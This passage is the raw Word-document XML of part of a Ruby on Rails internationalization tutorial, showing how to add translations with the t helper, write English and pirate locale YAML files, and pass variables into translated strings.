              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  root :to</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "home#index"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="06E17673" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1289C2C4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A019A64" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># app/controllers/home_controller.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A8CC938" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>HomeController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4610297B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>index</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7514401A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    flash[:notice] = "Hello Flash"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24EC1F48" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1178CE1F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6288413E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="203BDA64" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># app/views/home/index.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3335F343" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;h1&gt;Hello World&lt;/h1&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="37C22F60" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;p&gt;&lt;%= flash[:notice] %&gt;&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="33E293DF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3E454674" wp14:editId="02AC9A19">
            <wp:extent cx="3752850" cy="1876425"/>
            <wp:effectExtent l="19050" t="0" r="0" b="0"/>
            <wp:docPr id="20" name="图片 4" descr="rails i18n demo untrans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ils i18n demo untranslated"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId548" cstate="print"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3752850" cy="1876425"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="164F8EDB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 Adding Translations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05282DEC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Obviously there are </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>two strings that are localized to English</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. In order to internationalize this code, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>replace these strings</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with calls to Rails’ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>#t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> helper with a key that makes sense for the translation:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5208"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="28937724" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="71765959" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># app/controllers/home_controller.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="644EA863" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>HomeController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="389EBDF3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>index</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3CE9E0E7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    flash[:notice] = t(:hello_flash)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7365DEA6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="261B7341" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="06213C4A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="441294C9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># app/views/home/index.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17E2BBD0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;h1&gt;&lt;%=t :hello_world</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;&lt;/h1&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="704BD767" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;p&gt;&lt;%= flash[:notice] %&gt;&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3C4E6922" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When you now render this view, it will show an error message which tells you that the translations for the keys </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:hello_world</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:hello_flash</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> are missing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27241B04" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="32A06F46" wp14:editId="4FD9A121">
            <wp:extent cx="3752850" cy="1876425"/>
            <wp:effectExtent l="19050" t="0" r="0" b="0"/>
            <wp:docPr id="19" name="图片 5" descr="rails i18n demo translation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ls i18n demo translation missing"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId549" cstate="print"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3752850" cy="1876425"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F2D1DE1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rails adds a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>translate</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) helper method to your views so that you do not need to spell out </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>I18n.t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> all the time. Additionally this helper will catch missing translations and wrap the resulting error message into a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>&lt;span class="translation_missing"&gt;</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70E007C5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>So let’s add the missing translations into the dictionary files (i.e. do the “localization” part):</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3480"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="714F8B12" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5D96F1E6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># config/locales/en.yml</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="02CADC99" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>en:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B7D9D78" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  hello_world: Hello world!</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D0ECDCD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  hello_flash: Hello flash!</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1BFA0DB6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="62ECC998" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># config/locales/pirate.yml</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="30FEBB30" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>pirate:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="375FFAA7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  hello_world: Ahoy World</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="781FA6D1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  hello_flash: Ahoy Flash</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="13972827" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>There you go. Because you haven’t changed the default_locale, I18n will use English. Your application now shows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28EC2853" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6B075184" wp14:editId="12CF2FB0">
            <wp:extent cx="3752850" cy="1876425"/>
            <wp:effectExtent l="19050" t="0" r="0" b="0"/>
            <wp:docPr id="18" name="图片 6" descr="rails i18n demo translated to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ils i18n demo translated to English"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId550" cstate="print"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3752850" cy="1876425"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="06D3CEEC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">And when you change the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to pass the pirate locale (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>http://localhost:3000?locale=pirate</w:t>
      </w:r>
      <w:r>
        <w:t>), you’ll get:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06B5F440" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="31653ACC" wp14:editId="138D5F02">
            <wp:extent cx="3752850" cy="1876425"/>
            <wp:effectExtent l="19050" t="0" r="0" b="0"/>
            <wp:docPr id="10" name="图片 7" descr="rails i18n demo translated to pi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ls i18n demo translated to pirate"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId551" cstate="print"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3752850" cy="1876425"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D67FDCA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You need to restart the server when you add new locale files.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="697FED3F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You may use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>YAML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.yml</w:t>
      </w:r>
      <w:r>
        <w:t>) or plain Ruby (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) files for storing your translations in SimpleStore. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>YAML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is the preferred option among Rails developers. However, it has one big disadvantage. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>YAML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is very sensitive to whitespace and special characters, so the application may not load your dictionary properly. Ruby files will crash your application on first request, so you may easily find what’s wrong. (If you encounter any “weird issues” with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>YAML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> dictionaries, try putting the relevant portion of your dictionary into a Ruby file.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BBD72EF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.2 Passing variables to translations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DEF2DFD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You can use variables in the translation messages and pass their values from the view.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7463"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="7E00B5B7" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3BC423CB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># app/views/home/index.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E9DF743" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=t 'greet_username', :user</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "Bill", :message</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "Goodbye"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D23C159" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1FBD3E7D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># config/locales/en.yml</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A12FC01" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>en:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="055A8DDB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  greet_username: "%{message}, %{user}!"</w:t>
            </w:r>
          </w:p>
